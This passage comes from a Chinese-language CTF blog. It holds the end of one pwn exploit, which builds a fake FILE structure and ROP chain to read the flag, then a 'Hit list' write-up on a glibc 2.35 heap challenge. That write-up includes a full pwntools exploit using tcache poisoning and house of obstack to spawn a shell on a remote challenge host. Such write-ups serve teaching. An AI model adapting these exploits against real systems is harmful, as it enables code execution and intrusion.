class="hljs-string">&quot;heap_addr:&quot;</span> + hex(heap_addr))<br><br>IO_list_all = libc_base + libc.symbols[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br><br>payload1 = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(IO_list_all - <span class="hljs-number">0x20</span>)<br><span class="hljs-keyword">edit</span>(<span class="hljs-number">0</span>,payload1)<br><br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x538</span>)<br><span class="hljs-meta">#pause()</span><br><br>io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,b<span class="hljs-string">&#x27;3&#x27;</span>)<br>io.sendlineafter(b<span class="hljs-string">&#x27;Index&#x27;</span>,b<span class="hljs-string">&#x27;1&#x27;</span>)<br>payload = b<span class="hljs-string">&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>io.sendlineafter(b<span class="hljs-string">&#x27;Content:&#x27;</span>,payload)<br><span class="hljs-meta">#edit(1,b&#x27;a&#x27;*0x500 + b&#x27;flag&#x27;.ljust(8,b&#x27;\x00&#x27;))</span><br><br>_IO_wfile_jumps = libc_base+ libc.symbols[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br><br>system = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>op = libc_base + libc.symbols[<span class="hljs-string">&#x27;open&#x27;</span>]<br>re = libc_base + libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>wr = libc_base + libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>puts = libc_base + libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x10f75b</span> + libc_base<br>pop_rsi = <span class="hljs-number">0x110a4d</span> + libc_base<br>pop_rdx = <span class="hljs-number">0x66b9a</span> + libc_base<br>ret = <span class="hljs-number">0x2882f</span> + libc_base<br>ret_7 = <span class="hljs-number">0x380b7</span> + libc_base<br>setcontext = libc_base + libc.symbols[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>fake_io_addr = heap_addr + <span class="hljs-number">0xcd0</span><br>fake_struct = p64(<span class="hljs-number">0</span>) <span class="hljs-meta">#_IO_read_end</span><br>fake_struct += p64(<span class="hljs-number">0</span>) <span class="hljs-meta">#_IO_read_base</span><br>fake_struct += p64(<span class="hljs-number">0</span>) <span class="hljs-meta">#_IO_write_base</span><br>fake_struct += p64(<span class="hljs-number">0</span>) <span class="hljs-meta">#_IO_write_ptr</span><br>fake_struct += p64(<span class="hljs-number">0</span>) <span class="hljs-meta">#_IO_write_end</span><br>fake_struct += p64(<span class="hljs-number">0</span>) <span class="hljs-meta">#_IO_buf_base</span><br>fake_struct += p64(<span class="hljs-number">0</span>) <span class="hljs-meta">#_IO_buf_end</span><br>fake_struct += p64(<span class="hljs-number">1</span>) <span class="hljs-meta">#_IO_save_base</span><br>fake_struct += p64(fake_io_addr + <span class="hljs-number">0xb0</span>) <span class="hljs-meta">#_IO_backup_base = rdx</span><br>fake_struct += p64(setcontext + <span class="hljs-number">61</span>) <span class="hljs-meta">#_IO_save_end = call_addr</span><br>fake_struct += p64(<span class="hljs-number">0xffffffffffffff</span>)  <span class="hljs-meta">#_markers</span><br>fake_struct += p64(<span class="hljs-number">0</span>)  <span class="hljs-meta">#_chain</span><br>fake_struct += p64(<span class="hljs-number">0</span>)  <span class="hljs-meta">#_fileno</span><br>fake_struct += p64(<span class="hljs-number">0</span>)  <span class="hljs-meta">#_old_offset</span><br>fake_struct += p64(<span class="hljs-number">0</span>)  <span class="hljs-meta">#_cur_column</span><br>fake_struct += p64(heap_addr + <span class="hljs-number">0x200</span>) <span class="hljs-meta">#_lock = heap_addr or writeable libc_addr</span><br>fake_struct += p64(<span class="hljs-number">0</span>) <span class="hljs-meta">#_offset</span><br>fake_struct += p64(<span class="hljs-number">0</span>) <span class="hljs-meta">#_codecvx</span><br>fake_struct += p64(fake_io_addr + <span class="hljs-number">0x30</span>) <span class="hljs-meta">#_wfile_data rax1</span><br>fake_struct += p64(<span class="hljs-number">0</span>) <span class="hljs-meta">#_freers_list</span><br>fake_struct += p64(<span class="hljs-number">0</span>) <span class="hljs-meta">#_freers_buf</span><br>fake_struct += p64(<span class="hljs-number">0</span>) <span class="hljs-meta">#__pad5</span><br>fake_struct += p32(<span class="hljs-number">1</span>) <span class="hljs-meta">#_mode</span><br>fake_struct += b<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">20</span> <span class="hljs-meta">#_unused2</span><br>fake_struct += p64(_IO_wfile_jumps + <span class="hljs-number">0x30</span>) <span class="hljs-meta">#vtable</span><br>fake_struct += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span> <span class="hljs-meta">#padding</span><br>fake_struct += p64(fake_io_addr + <span class="hljs-number">0x40</span>) <span class="hljs-meta">#rax2 -&gt; to make [rax+0x18] = setcontext + 61</span><br><br>fake_struct = fake_struct.ljust(<span class="hljs-number">0x118</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(fake_io_addr + <span class="hljs-number">0x128</span> + <span class="hljs-number">0x28</span>) + p64(ret) + p64(<span class="hljs-number">0x60</span>)*<span class="hljs-number">3</span> + p64(fake_io_addr + <span class="hljs-number">0x128</span> + <span class="hljs-number">0x28</span>)<br>fake_struct += p64(pop_rdi) + p64(heap_addr+<span class="hljs-number">0xcd0</span> - <span class="hljs-number">0x500</span>) + p64(op)<br>fake_struct += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x330</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x60</span>) + p64(ret_7) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + b<span class="hljs-string">&#x27;0&#x27;</span> + p64(re) + b<span class="hljs-string">&#x27;0000000&#x27;</span><br>fake_struct += p64(pop_rdi) + p64(heap_addr + <span class="hljs-number">0x330</span>) + p64(puts)<br><br><span class="hljs-keyword">edit</span>(<span class="hljs-number">2</span>,fake_struct)<br>io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,b<span class="hljs-string">&#x27;5&#x27;</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="Hit-list"><a href="#Hit-list" class="headerlink" title="Hit list"></a>Hit list</h2><p>本题也是有增删查改四个功能的模板题，实现了一个单链表。做题的时候画了一个草图（有点难看请见谅<br><img src="/images/2.png" title="chunk"></p><p>对程序分析可以看出，每次调用add函数都会分配两个堆块，一个大小固定为0x20（我们叫它info块），另一个大小我们可以控制（我们叫它data块），但是最大只能有0x3f0 ，也就是说不能直接分配得到一个largebin。</p><p>接下来我们注意到，在edit函数中，每次我们调用时，都会先将数据块先free掉，再重新malloc一个。</p><p>最后在sub_13F3这个函数中，发现当我们malloc分配失败时，会调用gift函数，在这个函数中，我们有且仅有一次机会可以任意地址free。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__int64 <span class="hljs-title">gift</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">void</span> *ptr[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br><br>  ptr[<span class="hljs-number">1</span>] = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( !dword_4064 )<br>  &#123;<br>    <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%p&quot;</span>, ptr);<br>    <span class="hljs-built_in">free</span>(ptr[<span class="hljs-number">0</span>]);<br>    ++dword_4064;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>想要进入这个分支也很简单，传入一个负数就好了。</p><p>逆向分析完之后，我们就该想想怎么打这题了。</p><p>这题libc版本为2.35，无沙箱，漏洞点仅在gift函数的一次任意地址free里。<br>那么首先，我们应该先想办法泄露libc和heap的地址。</p><p>heap的地址可以通过tcache泄露出来，但是libc2.32加入了指针保护，即将fd指针地址右移12位再与fd指针本身异或。<br>一般来说，如果tcachebin链表中只有一个chunk时，只需直接将fd &lt;&lt; 12即可得到heap的基址。</p><p>这题因为info块里存着下一个堆块的地址，我就直接使用堆风水来泄露heap的地址了。就是将一个free后的info块，让它以data块的身份被申请出来，就可以直接泄露出heap的地址了。</p><p>有了heap的地址，现在还剩libc的地址。泄露libc地址常用的方式是利用largebin和unsortedbin。</p><p>这题largebin不太好弄，只能使用unsortedbin。但是unsortedbin也不好直接使用，首先因为存在tcache，程序取堆块会先从tcache里取，tcache空后也会先将unsortedbin里的堆块放入tcache中，再取出，这样会导致fd和bk指针被清空从而无法泄露libc地址。</p><p>所以我们就想到利用consolidate（关于这个机制可以看看这篇文章：<a href="https://blog.csdn.net/qq_41453285/article/details/97627411">堆漏洞挖掘中的malloc_consolidate与FASTBIN_CONSOLIDATION_THRESHOLD</a>。</p><p>为了利用这个机制，我们需要一个可以切割的unsortedbin。这个时候，我们想到了edit这个函数，它会先free掉data块，再重新malloc一个块。那么我们可以edit一个堆块，让它的data块的大小和之前不同，就可以在后面重新得到一个data块。之后再edit另一个堆块，我们就可以得到两个相邻的大堆块了，然后free掉这两个堆块，再add时，这两个堆块会合并，加入到unsortedbin里，然后就可以进行分割，从而泄露出libc地址了。</p><p>之后就是任意地址free，利用tcache poisoning打house of obstack了。</p><p>exp：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#io = process(&quot;./vuln&quot;)</span><br>io = remote(<span class="hljs-string">&quot;node1.hgame.vidar.club&quot;</span>,30436)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br>def <span class="hljs-built_in">add</span>(number,name,size,content):<br>    io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,b<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,str(number))<br>    io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,name)<br>    io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,str(size))<br>    io.sendafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,content)<br><br>def dele(index):<br>    io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,b<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,str(index))<br><br>def <span class="hljs-built_in">edit</span>(index,number,name,size,content):<br>    io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,b<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,str(index))<br>    io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,str(number))<br>    io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,name)<br>    io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,str(size))<br>    io.sendafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,content)<br><br>def show(index):<br>    io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,b<span class="hljs-string">&#x27;4&#x27;</span>)<br>    io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,str(index))<br><br><span class="hljs-comment">#gdb.attach(io)</span><br><br>payload = p64(0)<span class="hljs-number">*3</span> + p64(0) + p64(0x101)<br><span class="hljs-built_in">add</span>(12345678,b<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>,0x80,payload)<br><span class="hljs-built_in">add</span>(12345678,b<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>,0x90,b<span class="hljs-string">&#x27;why&#x27;</span>) #0<br><span class="hljs-built_in">add</span>(12345678,b<span class="hljs-string">&#x27;zzzzzzzz&#x27;</span>,0x80,b<span class="hljs-string">&#x27;asdadad&#x27;</span>)<br><br>dele(0)<br>dele(1)<br><br><span class="hljs-built_in">add</span>(555555,b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*0</span>x8,0x20,b<span class="hljs-string">&#x27;b&#x27;</span><span class="hljs-number">*0</span>x10) #1<br><br>show(1)<br>io.recvuntil(b<span class="hljs-string">&#x27;b&#x27;</span><span class="hljs-number">*0</span>x10)<br>heap_addr = u64(io.recv(6).ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>)) - 0x2d0<br><span class="hljs-built_in">print</span>(hex(heap_addr))<br><br><span class="hljs-built_in">add</span>(12345678,b<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>,0x380,b<span class="hljs-string">&#x27;a&#x27;</span>) #2<br><span class="hljs-built_in">add</span>(12345678,b<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>,0x380,b<span class="hljs-string">&#x27;a&#x27;</span>) #3<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(7):<br>    <span class="hljs-built_in">add</span>(12345678,b<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>,0x3a0,b<span class="hljs-string">&#x27;a&#x27;</span>)<br><br><span class="hljs-comment">#pause()</span><br><br><span class="hljs-built_in">edit</span>(2,12345678,b<span class="hljs-string">&#x27;0&#x27;</span>,0x3a0,b<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-built_in">edit</span>(3,12345678,b<span class="hljs-string">&#x27;0&#x27;</span>,0x3a0,b<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-built_in">add</span>(12345678,b<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>,0x20,b<span class="hljs-string">&#x27;z&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(7):<br>    dele(10-i)<br>dele(2)<br>dele(2)<br><span class="hljs-built_in">add</span>(12345678,b<span class="hljs-string">&#x27;a&#x27;</span>,0x200,b<span class="hljs-string">&#x27;\xe0&#x27;</span>)<br>show(3)<br><br>io.recvuntil(b<span class="hljs-string">&#x27;Information: &#x27;</span>)<br>libc_base = u64(io.recv(6).ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>)) - 1376 - 0x21AC80<br><span class="hljs-built_in">print</span>(hex(libc_base))<br><span class="hljs-built_in">print</span>(hex(heap_addr))<br><br><span class="hljs-built_in">add</span>(12345678,b<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>,0x20,b<span class="hljs-string">&#x27;z&#x27;</span>)<br><span class="hljs-built_in">add</span>(12345678,b<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>,0x20,b<span class="hljs-string">&#x27;z&#x27;</span>)<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">system </span>= libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + next(libc.search(b<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>))<br>_IO_obstack_jumps = libc_base + 0x2173c0<br><br>payload5 = flat(<br>&#123;<br>0x18:1,<br>0x20:0,<br>0x28:1,<br>0x30:0,<br>0x38:p64(system),<br>0x48:p64(bin_sh),<br>0x50:1,<br>0xd8:p64(_IO_obstack_jumps+0x20),<br>0xe0:p64(heap_addr + 0x2990 + 0x10 + 0x8),<br>&#125;,<br>filler = <span class="hljs-string">&#x27;\x00&#x27;</span><br>)<br><br><span class="hljs-built_in">add</span>(12345678,b<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>,0x3f0,payload5)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(2):<br>    dele(0)<br><br>io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,b<span class="hljs-string">&#x27;1&#x27;</span>)<br>io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,str(123))<br>io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,b<span class="hljs-string">&#x27;b&#x27;</span>)<br>io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,str(-9))<br><br>payload1 = heap_addr + 0x300<br>payload1 = hex(payload1).encode()<br><br>io.recvuntil(b<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br><span class="hljs-built_in">print</span>(payload1)<br>io.sendline(payload1)<br><br>IO_list_all = libc_base + libc.symbols[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>] - 0x10<br>fd = (heap_addr &gt;&gt; 12) ^ IO_list_all<br>payload2 = p64(0)<span class="hljs-number">*10</span> + p64(0x31) + p64(fd)<br><span class="hljs-built_in">add</span>(12345678,b<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>,0xf0,payload2)<br><span class="hljs-built_in">add</span>(12345678,p64(heap_addr),0x20,p64(heap_addr) + p64(heap_addr + 0x2990 + 0x10 + 0x8))<br><br>io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,b<span class="hljs-string">&#x27;5&#x27;</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
